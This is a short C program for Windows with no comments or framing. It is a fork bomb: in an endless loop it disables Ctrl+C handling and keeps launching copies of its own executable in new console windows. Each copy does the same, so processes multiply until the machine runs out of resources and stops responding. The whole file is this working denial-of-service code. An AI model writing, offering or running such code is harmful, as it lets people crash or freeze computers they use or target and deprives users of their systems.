#include <windows.h>
int main(int argc,char **argv) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    while (1) {
        SetConsoleCtrlHandler(0, 1);
        CreateProcess(*argv, 0, 0, 0, 0, CREATE_NEW_CONSOLE, 0, 0, &si, &pi);
    }
    return 0;
}
